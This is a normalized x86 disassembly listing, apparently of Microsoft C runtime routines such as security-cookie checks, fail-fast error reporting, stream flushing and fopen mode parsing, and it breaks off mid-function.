jmp r-xdata
call sub_42d3b1
pop ecx
jmp r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
retn
sub_430b87
push sub_43082a
call sub_42f90b
mov [ rw-data ] eax
cmp eax 0xffffffff
jne r-xdata
call sub_430b02
test eax eax
jne r-xdata
xor al al
retn
mov al 0x1
retn
push eax
call sub_430bb3
pop ecx
jmp r-xdata
sub_430bef
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
mov eax [ ebp + 0x8 ]
ror eax cl
xor eax [ rw-data ]
pop ebp
retn
sub_430c0e
mov edi edi
push ebp
mov ebp esp
lea eax [ ecx + 0x4 ]
mov edx eax
sub edx ecx
add edx 0x3
push esi
xor esi esi
shr edx 0x2
cmp eax ecx
sbb eax eax
not eax
and eax edx
je r-xdata
pop esi
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
inc esi
mov [ ecx ] edx
lea ecx [ ecx + 0x4 ]
cmp esi eax
jne r-xdata
sub_430c42
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x8 ] 0xffffffff
push edi
je r-xdata
push 0x50
lea eax [ ebp - 0x320 ]
push 0x0
push eax
call sub_40dea0
push 0x2cc
lea eax [ ebp - 0x2d0 ]
push 0x0
push eax
call sub_40dea0
lea eax [ ebp - 0x320 ]
add esp 0x18
mov [ ebp - 0x328 ] eax
lea eax [ ebp - 0x2d0 ]
mov [ ebp - 0x324 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
mov [ ebp - 0x218 ] eax
lea eax [ ebp + 0x4 ]
mov [ ebp - 0x20c ] eax
mov [ ebp - 0x2d0 ] 0x10001
mov eax [ eax - 0x4 ]
mov [ ebp - 0x21c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x320 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x31c ] eax
mov eax [ ebp + 0x4 ]
mov [ ebp - 0x314 ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov edi eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x328 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
call sub_40d204
pop ecx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop edi
call sub_40c38e
mov esp ebp
pop ebp
retn
test edi edi
jne r-xdata
cmp [ ebp + 0x8 ] 0xffffffff
je r-xdata
push [ ebp + 0x8 ]
call sub_40d204
pop ecx
sub_430db5
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
call sub_430b02
test eax eax
je r-xdata
push [ ebp + 0x18 ]
mov esi [ rw-data ]
mov ecx esi
push [ ebp + 0x14 ]
xor esi [ rw-data ]
and ecx 0x1f
push [ ebp + 0x10 ]
ror esi cl
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
test esi esi
jne r-xdata
mov esi [ eax + 0x35c ]
test esi esi
je r-xdata
mov ecx esi
call [ r--data ]
call esi
mov ecx [ ebp - 0x4 ]
add esp 0x14
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn
call sub_430e5d
int3
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
sub_430e42
push esi
xor esi esi
push esi
push esi
push esi
push esi
push esi
call sub_430db5
add esp 0x14
push esi
push esi
push esi
push esi
push esi
call sub_430e5d
int3
sub_430e5d
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
push esi
push 0x1
mov esi 0xc0000417
push esi
push 0x2
call sub_430c42
add esp 0xc
push esi
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
pop esi
retn
push 0x5
pop ecx
int 0x29
sub_430e90
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ rw-data ]
push edi
push [ ebp + 0x8 ]
mov edi esi
xor edi [ rw-data ]
call sub_430bef
pop ecx
and esi 0x1f
mov [ rw-data ] eax
mov ecx esi
ror edi cl
mov eax edi
pop edi
pop esi
pop ebp
retn
sub_430edd
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
mov eax [ eax * 8 + r--data ]
pop ebp
retn
inc eax
cmp eax 0x2d
jb r-xdata
cmp ecx [ eax * 8 + r--data ]
je r-xdata
lea eax [ ecx - 0x13 ]
cmp eax 0x11
ja r-xdata
lea eax [ ecx - 0xbc ]
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_430f20
mov edi edi
push ebp
mov ebp esp
push esi
call sub_430f43
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_430edd
pop ecx
mov esi eax
call sub_430f56
mov [ eax ] esi
pop esi
pop ebp
retn
sub_430f69
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
call sub_430f43
mov eax [ eax ]
mov [ esi ] eax
xor eax eax
call sub_430e30
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_430f8e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
call sub_430f56
mov eax [ eax ]
mov [ esi ] eax
xor eax eax
call sub_430e30
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_430fb3
mov edi edi
push ebp
mov ebp esp
call sub_430b02
test eax eax
jne r-xdata
call sub_430f43
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
xor eax eax
pop ebp
retn
push 0xc
pop eax
pop ebp
retn
sub_430fd4
mov edi edi
push ebp
mov ebp esp
call sub_430b02
test eax eax
jne r-xdata
call sub_430f56
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
xor eax eax
pop ebp
retn
push 0xc
pop eax
pop ebp
retn
sub_431005
push 0x10
push r--data
call sub_40d270
and [ ebp - 0x1c ] 0x0
push 0x8
call sub_42f07b
pop ecx
and [ ebp - 0x4 ] 0x0
push 0x3
pop esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43109c
mov eax [ ebp - 0x1c ]
call sub_40d2b6
retn
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test eax eax
je r-xdata
inc esi
jmp r-xdata
mov eax [ eax + 0xc ]
shr eax 0xd
test al 0x1
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ eax + esi * 4 ]
call sub_42d3b1
pop ecx
mov eax [ rw-data ]
and [ eax + esi * 4 ] 0x0
mov eax [ rw-data ]
push [ eax + esi * 4 ]
call sub_417838
pop ecx
cmp eax 0xffffffff
je r-xdata
inc [ ebp - 0x1c ]
sub_4310d4
mov edi edi
push ebp
mov ebp esp
mov edx [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
add edx 0xc
not esi
mov eax [ edx ]
mov ecx eax
and ecx esi
[ edx ] ecx
jne r-xdata
and eax [ ebp + 0x8 ]
neg eax
pop esi
sbb eax eax
neg eax
pop ebp
retn 0x4
sub_4310fe
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
lea esi [ ecx + 0xc ]
mov eax [ esi ]
and al 0x3
cmp al 0x2
je r-xdata
mov eax [ esi ]
test al 0xc0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ecx + 0x4 ]
push edi
mov edi [ ecx ]
sub edi eax
mov [ ecx ] eax
and [ ecx + 0x8 ] 0x0
test edi edi
jle r-xdata
pop esi
pop ebp
retn
xor eax eax
push edi
push eax
push ecx
call sub_4321dd
pop ecx
push eax
call sub_4327e1
add esp 0xc
cmp edi eax
je r-xdata
mov eax [ esi ]
shr eax 0x2
test al 0x1
je r-xdata
push 0x10
pop eax
[ esi ] eax
or eax 0xffffffff
jmp r-xdata
push 0xfffffffd
pop eax
[ esi ] eax
pop edi
sub_431164
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_4310fe
pop ecx
test eax eax
je r-xdata
push esi
call sub_4311b4
pop ecx
jmp r-xdata
mov eax [ esi + 0xc ]
shr eax 0xb
test al 0x1
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_4321dd
push eax
call sub_43d757
pop ecx
pop ecx
test eax eax
jne r-xdata
sub_4311b4
push 0x1c
push r--data
call sub_40d270
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x24 ] 0x0
push 0x8
call sub_42f07b
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ rw-data ]
mov eax [ rw-data ]
lea eax [ esi + eax * 4 ]
mov [ ebp - 0x2c ] eax
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_431283
cmp ebx 0x1
mov eax [ ebp - 0x1c ]
je r-xdata
mov edi [ esi ]
mov [ ebp - 0x28 ] edi
test edi edi
je r-xdata
call sub_40d2b6
retn
mov eax [ ebp - 0x24 ]
add esi 0x4
jmp r-xdata
push edi
call sub_417440
pop ecx
mov [ ebp - 0x4 ] 0x1
mov eax [ edi + 0xc ]
shr eax 0xd
test al 0x1
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi eax
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_431259
mov eax [ ebp - 0x2c ]
cmp ebx 0x1
jne r-xdata
test ebx ebx
jne r-xdata
push edi
call sub_431164
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ edi + 0xc ]
shr eax 0x1
test al 0x1
je r-xdata
inc [ ebp - 0x1c ]
jmp r-xdata
push edi
call sub_431164
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_43128c
push 0xc
push r--data
call sub_40d270
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
and [ ebp - 0x1c ] 0x0
push esi
call sub_417440
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_431164
pop ecx
mov edi eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4312dd
mov eax edi
push esi
call sub_4311b4
pop ecx
jmp r-xdata
call sub_40d2b6
retn
sub_4312f1
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
lea edi [ esi + 0xc ]
mov eax [ edi ]
shr eax 0xd
test al 0x1
je r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ edi ]
shr eax 0x6
test al 0x1
je r-xdata
push [ esi + 0x4 ]
call sub_42d3b1
pop ecx
mov eax 0xfffffebf
[ edi ] eax
xor eax eax
mov [ esi + 0x4 ] eax
mov [ esi ] eax
mov [ esi + 0x8 ] eax
sub_43132f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
sub eax 0x0
je r-xdata
push 0xfffffff6
sub eax 0x1
je r-xdata
push 0xfffffff5
jmp r-xdata
push 0xfffffff4
sub eax 0x1
jmp r-xdata
pop eax
pop ebp
retn
sub_431351
mov edi edi
push ebp
mov ebp esp
sub esp 0x48
lea eax [ ebp - 0x48 ]
push eax
call [ GetStartupInfoW@IAT ]
cmp [ ebp - 0x16 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
push ebx
push esi
mov esi [ eax ]
lea ebx [ eax + 0x4 ]
lea eax [ ebx + esi ]
mov [ ebp - 0x4 ] eax
mov eax 0x2000
cmp esi eax
jl r-xdata
push esi
call sub_438c66
mov eax [ rw-data ]
pop ecx
cmp esi eax
jle r-xdata
mov esi eax
push edi
xor edi edi
test esi esi
je r-xdata
mov esi eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x4 ]
inc edi
add eax 0x4
inc ebx
mov [ ebp - 0x4 ] eax
cmp edi esi
jne r-xdata
cmp ecx 0xfffffffe
je r-xdata
mov ecx [ eax ]
cmp ecx 0xffffffff
je r-xdata
mov dl [ ebx ]
test dl 0x1
je r-xdata
test dl 0x8
jne r-xdata
mov eax edi
mov ecx edi
and eax 0x3f
sar ecx 0x6
imul edx eax 0x30
mov eax [ ebp - 0x4 ]
add edx [ ecx * 4 + rw-data ]
mov eax [ eax ]
mov [ edx + 0x18 ] eax
mov al [ ebx ]
mov [ edx + 0x28 ] al
push ecx
call [ GetFileType@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
sub_431407
mov edi edi
push ebx
push esi
push edi
xor edi edi
mov eax edi
mov [ esi + 0x28 ] 0x81
sub eax 0x0
je r-xdata
cmp [ esi + 0x18 ] 0xfffffffe
je r-xdata
push 0xfffffff6
sub eax 0x1
je r-xdata
or [ esi + 0x28 ] 0x80
jmp r-xdata
xor eax eax
test ebx ebx
je r-xdata
push 0xfffffff5
jmp r-xdata
push 0xfffffff4
sub eax 0x1
jmp r-xdata
inc edi
cmp edi 0x3
jne r-xdata
or [ esi + 0x28 ] 0x40
mov [ esi + 0x18 ] 0xfffffffe
mov eax [ rw-data ]
test eax eax
je r-xdata
and eax 0xff
mov [ esi + 0x18 ] ebx
cmp eax 0x2
jne r-xdata
push ebx
call [ GetFileType@IAT ]
jmp r-xdata
pop eax
push eax
call [ GetStdHandle@IAT ]
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
mov eax edi
mov ecx edi
and eax 0x3f
sar ecx 0x6
imul esi eax 0x30
add esi [ ecx * 4 + rw-data ]
cmp [ esi + 0x18 ] 0xffffffff
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + edi * 4 ]
mov [ eax + 0x10 ] 0xfffffffe
cmp eax 0x3
jne r-xdata
or [ esi + 0x28 ] 0x40
jmp r-xdata
test eax eax
je r-xdata
or [ esi + 0x28 ] 0x8
jmp r-xdata
sub_4314bd
push 0xc
push r--data
call sub_40d270
push 0x7
call sub_42f07b
pop ecx
xor ebx ebx
mov [ ebp - 0x19 ] bl
mov [ ebp - 0x4 ] ebx
push ebx
call sub_438c66
pop ecx
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43150a
mov al bl
call sub_40d2b6
retn
call sub_431351
call sub_431407
mov bl 0x1
mov [ ebp - 0x19 ] bl
sub_431515
push esi
xor esi esi
add esi 0x4
cmp esi 0x200
jb r-xdata
push eax
call sub_438c31
and [ esi + rw-data ] 0x0
pop ecx
mov eax [ esi + rw-data ]
test eax eax
je r-xdata
mov al 0x1
pop esi
retn
sub_431579
push 0xc
push r--data
call sub_40d270
xor edi edi
mov esi [ ebp + 0x8 ]
mov [ esi ] edi
push 0x8
call sub_42f07b
pop ecx
mov [ ebp - 0x4 ] edi
lea eax [ ebp - 0x1c ]
push eax
call sub_431623
pop ecx
mov eax [ eax ]
mov [ esi ] eax
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4315cf
mov eax esi
call sub_40d2b6
retn
mov [ eax + 0x8 ] edi
mov [ eax + 0x1c ] edi
mov [ eax ] edi
mov [ eax + 0x4 ] edi
or [ eax + 0x10 ] 0xffffffff
sub_4315d8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov [ eax ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] ecx
mov eax [ ebp + 0x8 ]
or [ eax + 0x10 ] 0xffffffff
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x18 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1c ] ecx
mov eax [ ebp + 0x8 ]
add eax 0xc
xchg [ eax ] ecx
pop ebp
retn
sub_431623
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ rw-data ]
push esi
push edi
mov edi [ rw-data ]
add edi 0xc
add ebx 0xfffffffd
lea ebx [ edi + ebx * 4 ]
mov [ ebp - 0x4 ] ebx
jmp r-xdata
cmp edi ebx
jne r-xdata
mov esi [ edi ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
and [ eax ] 0x0
push 0x38
push 0x1
call sub_42d49d
push 0x0
mov [ edi ] eax
call sub_42d3b1
mov eax [ edi ]
add esp 0xc
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
shr eax 0xd
test al 0x1
jne r-xdata
or [ eax + 0x10 ] 0xffffffff
mov eax [ edi ]
push 0x0
push 0xfa0
add eax 0x20
push eax
call sub_42fd88
mov esi [ edi ]
mov ecx 0x2000
lea eax [ esi + 0xc ]
[ eax ] ecx
push esi
call sub_417440
pop ecx
jmp r-xdata
add edi 0x4
push esi
call sub_417440
pop ecx
lea edx [ esi + 0xc ]
mov ebx 0x2000
mov eax [ edx ]
mov eax [ ebp + 0x8 ]
mov [ eax ] esi
jmp r-xdata
mov ecx eax
or ecx ebx
[ edx ] ecx
jne r-xdata
mov ebx [ ebp - 0x4 ]
shr eax 0xd
not al
test al 0x1
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
call sub_417454
pop ecx
sub_431701
mov edx [ ecx ]
push esi
mov esi 0x2000
add edx 0xc
mov eax [ edx ]
mov ecx eax
or ecx esi
[ edx ] ecx
jne r-xdata
shr eax 0xd
not eax
and eax 0x1
pop esi
retn
sub_431722
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
lea edi [ ebp - 0x10 ]
stosd [ edi ]
lea esi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
mov edi ebx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
mov esi [ ebp + 0xc ]
mov [ ebx + 0x4 ] eax
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
inc esi
mov al [ esi ]
xor ecx ecx
cmp al 0x61
je r-xdata
mov [ ebx ] 0x109
cmp al 0x72
je r-xdata
mov ch [ ebp - 0x1 ]
movsx eax al
cmp eax 0x53
jg r-xdata
mov [ ebx ] ecx
mov [ ebx + 0x4 ] 0x1
jmp r-xdata
cmp al 0x77
jne r-xdata
cmp [ esi ] 0x20
je r-xdata
inc esi
sub eax 0x54
je r-xdata
je r-xdata
mov dl cl
mov [ ebp - 0x3 ] cl
mov ch cl
mov [ ebp - 0x4 ] cl
inc esi
mov [ ebp - 0x2 ] dl
mov [ ebp - 0x1 ] ch
mov cl 0x1
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
mov [ ebx ] 0x301
jmp r-xdata
test ch ch
jne r-xdata
push ebx
call sub_431e3b
sub eax 0xe
je r-xdata
mov ch [ ebp - 0x1 ]
test dl dl
jne r-xdata
sub eax 0x20
je r-xdata
mov [ ebx + 0x4 ] 0x2
push 0x3
push r--data
push esi
call sub_43d980
add esp 0xc
test eax eax
jne r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
jmp r-xdata
push ebx
call sub_431e5a
jmp r-xdata
sub eax 0x1
je r-xdata
xor cl cl
jmp r-xdata
or [ ebx ] 0x20
mov ch [ ebp - 0x1 ]
sub eax 0xb
je r-xdata
push 0x20
add esi 0x3
pop eax
jmp r-xdata
mov [ ebx + 0x8 ] 0x1
jmp r-xdata
test ch ch
je r-xdata
mov dl [ ebp - 0x2 ]
pop ecx
mov cl al
lea eax [ ebp - 0x3 ]
push eax
push ebx
call sub_431e7a
jmp r-xdata
sub eax 0xb
je r-xdata
xor eax eax
test cl cl
setne al
add esi eax
test cl cl
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
push ebx
call sub_431ebe
sub eax 0x1
je r-xdata
cmp [ esi ] al
je r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
pop ecx
jmp r-xdata
lea eax [ ebp - 0x3 ]
push eax
push ebx
call sub_431e9c
jmp r-xdata
sub eax 0x6
jne r-xdata
mov ch 0x1
mov [ ebp - 0x1 ] ch
sub eax 0x18
je r-xdata
inc esi
cmp [ esi ] 0x3d
jne r-xdata
push ebx
call sub_431ef3
jmp r-xdata
push ebx
call sub_431dd2
jmp r-xdata
sub eax 0xa
je r-xdata
inc esi
cmp [ esi ] al
je r-xdata
or [ ebx ] 0x80
mov cl 0x1
jmp r-xdata
sub eax 0x4
jne r-xdata
push 0x5
push r--data
push esi
call sub_43d9f8
add esp 0xc
test eax eax
jne r-xdata
mov ch [ ebp - 0x1 ]
test dl dl
jne r-xdata
push 0x8
push r--data
push esi
call sub_43d9f8
add esp 0xc
test eax eax
jne r-xdata
add esi 0x5
or [ ebx ] 0x40000
jmp r-xdata
or [ ebx ] 0x10
jmp r-xdata
push 0x7
push r--data
push esi
call sub_43d9f8
add esp 0xc
test eax eax
jne r-xdata
add esi 0x8
or [ ebx ] 0x20000
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
mov dl 0x1
mov [ ebp - 0x2 ] dl
mov cl dl
jmp r-xdata
add esi 0x7
or [ ebx ] 0x10000
jmp r-xdata
inc esi
jmp r-xdata
sub_431954
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
lea edi [ ebp - 0x10 ]
stosd [ edi ]
lea esi [ ebp - 0x10 ]
push 0x2
pop ecx
push 0x20
stosd [ edi ]
stosd [ edi ]
mov edi ebx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
mov esi [ ebp + 0xc ]
mov [ ebx + 0x4 ] eax
pop edi
jmp r-xdata
cmp [ esi ] di
je r-xdata
add esi ecx
movzx eax [ esi ]
xor edx edx
cmp eax 0x61
je r-xdata
mov [ ebx ] 0x109
cmp eax 0x72
je r-xdata
mov ch [ ebp - 0x1 ]
cmp eax 0x53
jg r-xdata
mov [ ebx ] edx
mov [ ebx + 0x4 ] 0x1
jmp r-xdata
cmp eax 0x77
jne r-xdata
cmp [ esi ] di
je r-xdata
add esi 0x2
sub eax 0x54
je r-xdata
je r-xdata
add esi ecx
mov [ ebp - 0x3 ] dl
xor ch ch
mov [ ebp - 0x4 ] dl
mov [ ebp - 0x2 ] dl
mov cl 0x1
mov [ ebp - 0x1 ] ch
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
mov [ ebx ] 0x301
jmp r-xdata
test ch ch
jne r-xdata
push ebx
call sub_431e3b
sub eax 0xe
je r-xdata
mov ch [ ebp - 0x1 ]
test dl dl
jne r-xdata
sub eax edi
je r-xdata
mov [ ebx + 0x4 ] ecx
push 0x3
push r--data
push esi
call sub_43a3af
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
cmp [ esi ] ax
jne r-xdata
movzx eax [ esi ]
test ax ax
je r-xdata
jmp r-xdata
push ebx
call sub_431e5a
jmp r-xdata
sub eax 0x1
je r-xdata
xor cl cl
jmp r-xdata
or [ ebx ] edi
mov ch [ ebp - 0x1 ]
sub eax 0xb
je r-xdata
add esi 0x6
jmp r-xdata
mov [ ebx + 0x8 ] 0x1
jmp r-xdata
test ch ch
je r-xdata
mov dl [ ebp - 0x2 ]
pop ecx
mov cl al
lea eax [ ebp - 0x3 ]
push eax
push ebx
call sub_431e7a
jmp r-xdata
sub eax 0xb
je r-xdata
xor eax eax
test cl cl
setne al
lea esi [ esi + eax * 2 ]
test cl cl
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
push ebx
call sub_431ebe
sub eax 0x1
je r-xdata
cmp [ esi ] di
je r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
pop ecx
jmp r-xdata
lea eax [ ebp - 0x3 ]
push eax
push ebx
call sub_431e9c
jmp r-xdata
sub eax 0x6
jne r-xdata
mov ch 0x1
mov [ ebp - 0x1 ] ch
sub eax 0x18
je r-xdata
add esi 0x2
cmp [ esi ] 0x3d
jne r-xdata
push ebx
call sub_431ef3
jmp r-xdata
push ebx
call sub_431dd2
jmp r-xdata
sub eax 0xa
je r-xdata
add esi 0x2
cmp [ esi ] di
je r-xdata
or [ ebx ] 0x80
mov cl 0x1
jmp r-xdata
sub eax 0x4
jne r-xdata
push 0x5
push r--data
push esi
call sub_43d7c6
add esp 0xc
test eax eax
jne r-xdata
mov ch [ ebp - 0x1 ]
test dl dl
jne r-xdata
push 0x8
push r--data
push esi
call sub_43d7c6
add esp 0xc
test eax eax
jne r-xdata
add esi 0xa
or [ ebx ] 0x40000
jmp r-xdata
or [ ebx ] 0x10
jmp r-xdata
push 0x7
push r--data
push esi
call sub_43d7c6
add esp 0xc
test eax eax
jne r-xdata
add esi 0x10
or [ ebx ] 0x20000
jmp r-xdata
cmp [ esi ] di
je r-xdata
mov dl 0x1
mov [ ebp - 0x2 ] dl
mov cl dl
jmp r-xdata
add esi 0xe
or [ ebx ] 0x10000
jmp r-xdata
add esi 0x2
jmp r-xdata
sub_431b98
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
push esi
push edi
push [ ebp + 0xc ]
lea eax [ ebp - 0x1c ]
push eax
call sub_431722
mov esi eax
lea edi [ ebp - 0x10 ]
pop ecx
pop ecx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ ebp - 0x8 ] 0x0
pop edi
pop esi
jne r-xdata
push 0x180
push [ ebp + 0x10 ]
lea eax [ ebp - 0x4 ]
push [ ebp - 0x10 ]
push [ ebp + 0x8 ]
push eax
call sub_43e593
add esp 0x14
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
inc [ rw-data ]
add eax 0xc
mov ecx [ ebp - 0xc ]
[ eax ] ecx
mov eax [ ebp + 0x14 ]
xor ecx ecx
mov [ eax + 0x8 ] ecx
mov eax [ ebp + 0x14 ]
mov [ eax + 0x1c ] ecx
mov eax [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov eax [ ebp - 0x4 ]
mov [ ecx + 0x10 ] eax
mov eax [ ebp + 0x14 ]
mov esp ebp
pop ebp
retn
sub_431c1d
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
push esi
push edi
push [ ebp + 0xc ]
lea eax [ ebp - 0x1c ]
push eax
call sub_431954
mov esi eax
lea edi [ ebp - 0x10 ]
pop ecx
pop ecx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ ebp - 0x8 ] 0x0
pop edi
pop esi
jne r-xdata
push 0x180
push [ ebp + 0x10 ]
lea eax [ ebp - 0x4 ]
push [ ebp - 0x10 ]
push [ ebp + 0x8 ]
push eax
call sub_43e934
add esp 0x14
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
inc [ rw-data ]
add eax 0xc
mov ecx [ ebp - 0xc ]
[ eax ] ecx
mov eax [ ebp + 0x14 ]
xor ecx ecx
mov [ eax + 0x8 ] ecx
mov eax [ ebp + 0x14 ]
mov [ eax + 0x1c ] ecx
mov eax [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov eax [ ebp - 0x4 ]
mov [ ecx + 0x10 ] eax
mov eax [ ebp + 0x14 ]
mov esp ebp
pop ebp
retn
sub_431d82
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x18 ]
push [ eax ]
mov eax [ ebp + 0x14 ]
push [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_43e593
add esp 0x14
pop ebp
retn
sub_431daa
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x18 ]
push [ eax ]
mov eax [ ebp + 0x14 ]
push [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_43e934
add esp 0x14
pop ebp
retn
sub_431dd2
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
test al 0x40
je r-xdata
or eax 0x40
mov [ ecx ] eax
mov al 0x1
pop ebp
retn
xor al al
pop ebp
retn
sub_431dff
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov [ eax ] 0x1
mov al 0x1
or [ ecx ] 0x10
pop ebp
retn
xor al al
pop ebp
retn
sub_431e1d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
